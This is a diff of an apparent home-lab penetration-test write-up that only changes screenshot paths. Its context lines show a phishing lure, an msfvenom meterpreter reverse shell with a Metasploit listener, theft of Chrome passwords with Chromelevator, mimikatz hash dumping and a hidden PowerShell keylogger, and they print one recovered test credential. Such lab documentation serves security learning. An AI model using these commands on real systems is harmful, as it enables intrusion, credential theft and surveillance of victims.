@@ -163,14 +163,14 @@ The email claimed the victim had won an **iPhone 16 Pro (256GB)** valued at $1,1
 2. Extract files with password: `iphone2026`
 3. Run `free.exe` to "generate activation token"
 
-![Phishing Email](screenshots/phishingemailsample.png)
+![Phishing Email](SCREENSHOTS/phishingemailsample.png)
 *Figure 1: Phishing email sent to victim claiming an iPhone 16 Pro prize*
 
 ### Payload Hosting on GitHub
 
 The malicious archive was hosted on a public GitHub repository named `prize-claim-tool`, adding a layer of perceived legitimacy.
 
-![GitHub Payload Repository](screenshots/FREE.EXE LINK.png)
+![GitHub Payload Repository](SCREENSHOTS/FREE.EXE LINK.png)
 *Figure 2: Public GitHub repository hosting the malicious `claim_redemption_form.zip`*
 
 ---
@@ -199,7 +199,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
 | Final EXE Size | 7,168 bytes |
 | Output File | `free.exe` |
 
-![Msfvenom Payload Generation](screenshots/msfvenom.png)
+![Msfvenom Payload Generation](SCREENSHOTS/msfvenom.png)
 *Figure 3: Msfvenom generating the malicious reverse shell payload*
 
 ### Payload Packaging
@@ -210,14 +210,14 @@ The payload was packaged into a **password-protected ZIP archive** to evade basi
 zip --password "iphone2026" claim_redemption_form.zip free.exe
 ```
 
-![ZIP Payload Packaging](screenshots/free.exezipfile.png)
+![ZIP Payload Packaging](SCREENSHOTS/free.exezipfile.png)
 *Figure 4: Creating password-protected ZIP archive containing the payload*
 
 ### Victim Side: Extraction
 
 Following the email instructions, the victim extracted the archive using the provided password `iphone2026`, revealing `free.exe`.
 
-![Victim Extracting Payload](screenshots/unzippingmaliciousshell.png)
+![Victim Extracting Payload](SCREENSHOTS/unzippingmaliciousshell.png)
 *Figure 5: Victim extracting the password-protected ZIP on Windows 10*
 
 ---
@@ -237,7 +237,7 @@ set LPORT 4444
 exploit
 ```
 
-![Metasploit Listener](screenshots/msfconsole.png)
+![Metasploit Listener](SCREENSHOTS/msfconsole.png)
 *Figure 6: Metasploit multi/handler configured and listening on port 4444*
 
 ### Meterpreter Session Established
@@ -250,7 +250,7 @@ When the victim executed `free.exe`, the payload activated and called back to th
 - **User Context:** `DESKTOP-1GS67M5\PC1`
 - **Architecture:** x64/windows
 
-![Meterpreter Session & Tool Upload](screenshots/uploading%20chromelev%20and%20ps1%20script%20to%20windows.png)
+![Meterpreter Session & Tool Upload](SCREENSHOTS/uploading chromelev and ps1 script to windows.png)
 *Figure 7: Meterpreter session established and tools being uploaded to the victim*
 
 ---
@@ -275,7 +275,7 @@ The first post-compromise activity was gathering **situational awareness** about
 - **System Language:** `en-US`
 - **Logged On Users:** 2
 
-![System Reconnaissance](screenshots/sysinfo%20and%20ipconfig.png)
+![System Reconnaissance](SCREENSHOTS/sysinfo%20and%20ipconfig.png)
 *Figure 8: Reconnaissance results — user, network, and OS information*
 
 ---
@@ -309,7 +309,7 @@ The first post-compromise activity was gathering **situational awareness** about
 - Installed patches & hotfixes
 - Potential privilege escalation vectors
 
-![WinPEAS Enumeration](screenshots/winPeas%20Basic%20info.png)
+![WinPEAS Enumeration](SCREENSHOTS/winPeas%20Basic%20info.png)
 *Figure 9: WinPEAS output showing detailed Basic System Information*
 
 ---
@@ -348,7 +348,7 @@ download C:\\Users\\PC1\\Desktop /home/butch
 
 **Destination:** `/home/butch/` on Kali Linux attacker
 
-![Document Extraction](screenshots/extract%20documents.png)
+![Document Extraction](SCREENSHOTS/extract%20documents.png)
 *Figure 10: Meterpreter downloading Desktop contents from victim to attacker machine*
 
 ---
@@ -367,7 +367,7 @@ cd Downloads
 unzip chrome-injector-v0.20.0.zip
 ```
 
-![Chromelevator Preparation](screenshots/downloaded%20and%20unzipping%20chromelevator.png)
+![Chromelevator Preparation](SCREENSHOTS/downloaded%20and%20unzipping%20chromelevator.png)
 *Figure 11: Downloading and unzipping Chromelevator on Kali Linux*
 
 **2. Upload to Victim**
@@ -375,7 +375,7 @@ unzip chrome-injector-v0.20.0.zip
 upload /home/butch/Downloads/chromelevator_x64.exe C:\\Windows\\Temp
 ```
 
-![Chromelevator Directory Confirmation](screenshots/chromelev%20directory%20confirmed.png)
+![Chromelevator Directory Confirmation](SCREENSHOTS/chromelev%20directory%20confirmed.png)
 *Figure 12: Confirming Chromelevator upload to `C:\Windows\Temp`*
 
 **3. Execute Chromelevator**
@@ -392,7 +392,7 @@ chromelevator_x64.exe chrome -o labrat
 | 🔐 Passwords Extracted | 1 |
 | 🎫 Tokens Extracted | 1 |
 
-![Chromelevator Execution](screenshots/executing%20chromelev.png)
+![Chromelevator Execution](SCREENSHOTS/executing%20chromelev.png)
 *Figure 13: Chromelevator executing and extracting Chrome credentials*
 
 **4. Recover Credentials via Meterpreter**
@@ -406,7 +406,7 @@ cat passwords_account.json
 - **Username:** `testingpen7@gmail.com`
 - **Password:** `P@ssw0rd090681`
 
-![Chrome Password Recovery](screenshots/chrome%20password%20retrieve.png)
+![Chrome Password Recovery](SCREENSHOTS/chrome%20password%20retrieve.png)
 *Figure 14: Reading extracted Chrome credentials from the JSON output file*
 
 ---
@@ -445,10 +445,10 @@ sekurlsa::logonpasswords
 
 > 💡 **Security Note:** Modern Windows protections (WDigest disabled, Credential Guard) prevented plaintext password recovery, but NTLM hashes were still extractable — these can be used in pass-the-hash attacks or cracked offline.
 
-![Mimikatz Execution 1](screenshots/mimikatz1.png)
+![Mimikatz Execution 1](SCREENSHOTS/mimikatz1.png)
 *Figure 15: Mimikatz `privilege::debug` and `sekurlsa::logonpasswords` execution*
 
-![Mimikatz Execution 2](screenshots/mimikatz2.png)
+![Mimikatz Execution 2](SCREENSHOTS/mimikatz2.png)
 *Figure 16: Mimikatz output showing extracted NTLM and SHA1 password hashes*
 
 ---
@@ -471,7 +471,7 @@ powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp
 - Instant write (no buffering)
 - Supports commands: `tools`, `keys`, `keyon`, `keyoff`, `exit`
 
-![Keylogger Deployment](screenshots/ps1%20script%20for%20keylogger.png)
+![Keylogger Deployment](SCREENSHOTS/ps1%20script%20for%20keylogger.png)
 *Figure 17: PowerShell keylogger being deployed and activated*
 
 ### Dummy Input Test
@@ -483,7 +483,7 @@ powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp
 testing testing 123
 ```
 
-![Keylogger Test Input](screenshots/windows%20keylog%20test.png)
+![Keylogger Test Input](SCREENSHOTS/windows%20keylog%20test.png)
 *Figure 18: Dummy test input typed into Notepad on the victim machine*
 
 ### Keystroke Retrieval
@@ -501,7 +501,7 @@ notepadtedtesting testing 123
 
 The keylogger successfully captured the test input, demonstrating how an attacker can monitor user activity in real-time.
 
-![Keylog Retrieval](screenshots/keylogs%20retrieve.png)
+![Keylog Retrieval](SCREENSHOTS/keylogs%20retrieve.png)
 *Figure 19: Successfully retrieving captured keystrokes from the victim*
 
 ---
